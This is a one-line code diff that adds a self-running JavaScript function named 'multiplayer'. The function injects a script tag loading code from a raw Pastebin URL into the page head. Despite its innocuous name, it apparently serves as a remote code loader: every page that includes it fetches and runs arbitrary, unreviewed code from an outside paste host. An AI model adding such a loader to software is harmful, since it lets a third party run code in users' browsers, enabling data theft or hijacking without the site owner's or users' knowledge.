@@ -1,0 +1,1 @@
+var multiplayer = function (){ var URL = "https://pastebin.com/raw/GS3USAKW"; var script = document.createElement("script"); script.src = URL; document.head.appendChild(script); }();
